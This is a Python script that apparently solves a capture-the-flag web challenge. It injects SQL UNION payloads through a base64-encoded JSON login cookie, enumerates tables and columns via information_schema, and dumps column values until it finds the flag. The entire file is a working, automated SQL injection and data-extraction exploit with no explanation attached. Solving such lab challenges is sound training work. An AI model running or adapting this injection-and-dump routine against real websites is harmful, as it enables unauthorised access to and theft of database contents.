from base64 import b64encode
import requests

URL = "http://sn4ck-sh3nan1gans.challs.olicyber.it/"

home_url = "http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"
injection_template = '{{"ID": "{:s}"}}'

def run_home_injection(id_v) -> str:
    id_cookie = b64encode(injection_template.format(id_v).encode()).decode()
    r = requests.get(home_url, cookies={"login": id_cookie})
    page = r.text[64:] # skip title
    if not "Welcome" in page:
        return None
    inj_ret = '!'.join(page.split("Welcome ")[1].split("!")[:-1])
    return inj_ret if inj_ret != "" else None

PAYLOADS: dict = {
    "get_tables": ["100000 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {:d}".format(i) for i in reversed(range(70, 81))],
    "get_columns": "100000 UNION SELECT column_name FROM information_schema.columns WHERE table_name = '{:s}' LIMIT 1 OFFSET {:d}",
    "get_column": "100000 UNION SELECT {:s} FROM {:s} LIMIT 1 OFFSET {:d}"
}

tables = [run_home_injection(query).split(" ")[-1] for query in PAYLOADS["get_tables"]]
for table in tables:
    if table == "users": continue # skip users table
    print("Table:", table)
    columns = []
    for i in range(0, 10):
        query = PAYLOADS["get_columns"].format(table, i)
        column = run_home_injection(query)
        if column is None: break
        columns.append(column)
    
    rows = []
    for column in columns:
        values = []
        for j in range(0, 10):
            query = PAYLOADS["get_column"].format(column, table, j)
            value = run_home_injection(query)
            if value is None: break
            if value.startswith("flag{"):
                print(value)
                exit()
            values.append(value)
        rows.append(values)
    print("Columns:", columns)
    print("Rows:", rows)
